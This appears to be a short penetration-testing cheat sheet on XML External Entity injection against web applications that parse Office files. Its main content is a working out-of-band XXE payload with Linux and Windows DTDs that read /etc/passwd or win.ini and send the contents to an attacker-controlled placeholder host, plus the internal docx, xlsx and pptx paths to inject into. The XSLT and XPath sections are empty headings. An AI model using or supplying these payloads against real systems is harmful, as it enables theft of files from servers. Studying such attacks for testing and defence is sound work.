# XML External Entity vulnerability
XML External Entity injection is a type of attack against web application that parses XML files (docx, pptx, xlsx etc.). There are three common attacks against XML parser:
- [XML data injection (XXE)](#xml-data-injection)
- [Extensible Stylesheet Language Transformations injection (XSLT)](#extensible-stylesheet-language-transformation)
- [XPath/XQuery injection](#xpath-injection)

## XML data injection
XML entity:
- xlsx: `/xl/worksheets/sheet1.xml`, `/xl/workbook.xml`
- docx: `/word/document.xml`
- pptx: `/ppt/presentation.xml`

Payload:
```
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://xxx.xxx.xxx.xxx/white-cat.dtd">
%sp;
%param1;
%exfil;
]>
```
DTD (Linux):
```
<!ENTITY % white-cat SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://xxx.xxx.xxx.xxx/?%white-cat;'>">
```
DTD (Windows):
```
<!ENTITY % white-cat SYSTEM "file://C:/Windows/win.ini">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://xxx.xxx.xxx.xxx/?%white-cat;'>">
```
Sample response with a content of `win.ini` file:
![Logo](https://www.pwncave.net/images/XXE_winini.PNG)

## Extensible Stylesheet Language Transformation

## XPath injection

### References
- https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf
- https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf
- Black Hat EU 2013 - XML Out-of-Band Data Retrieval: https://www.youtube.com/watch?v=eBm0YhBrT_c
- https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf
